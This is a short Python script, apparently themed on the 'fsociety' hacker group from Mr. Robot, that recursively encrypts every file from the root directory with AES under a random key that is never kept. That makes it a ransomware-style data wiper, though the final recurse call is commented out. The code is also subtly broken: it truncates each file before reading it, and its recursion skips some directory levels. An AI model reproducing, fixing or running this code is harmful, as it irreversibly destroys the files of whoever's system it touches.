#!/usr/local/bin/python3

import os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from random import SystemRandom
from string import ascii_letters, digits, punctuation


def encrypt(root, filename):
    fn = root + '/' + filename
    pw = 'fsociety'.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(4, 16)))) for x in range(SystemRandom().randint(8, 12)))
    hasher = SHA256.new(pw.encode('utf-8'))
    key = hasher.digest()
    cs = 64*1024
    of = fn
    fs = str(os.path.getsize(fn)).zfill(16)
    iv = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    with open(fn, 'rb') as infile:
        with open(of, 'wb') as outfile:
            outfile.write(fs.encode('utf-8'))
            outfile.write(iv)
            while True:
                c = infile.read(cs)
                if len(c) == 0:
                    break
                elif len(c) % 16 != 0:
                    c += b' ' * (16 - (len(c) % 16))
                outfile.write(encryptor.encrypt(c))


def recurse(directory):
    root = next(os.walk(directory))[0]
    directories = next(os.walk(directory))[1]
    files = next(os.walk(directory))[2]

    for file in files:
        encrypt(root, file)

    if len(directories) > 0:
        for directory in directories:
            subdirectories = next(os.walk(os.path.join(root, directory)))[1]
            if len(subdirectories) > 0:
                for subdirectory in subdirectories:
                    path = root + '/' + directory + '/' + subdirectory
                    try:
                        recurse(directory=path)
                    except UnicodeEncodeError:
                        pass
            else:
                pass


def main():
    start_dir = '/'
    if input('Are you sure? (y/n) ') == 'y':
        # recurse(start_dir)
        pass
    else:
        print('Good')

if __name__ == '__main__':
    main()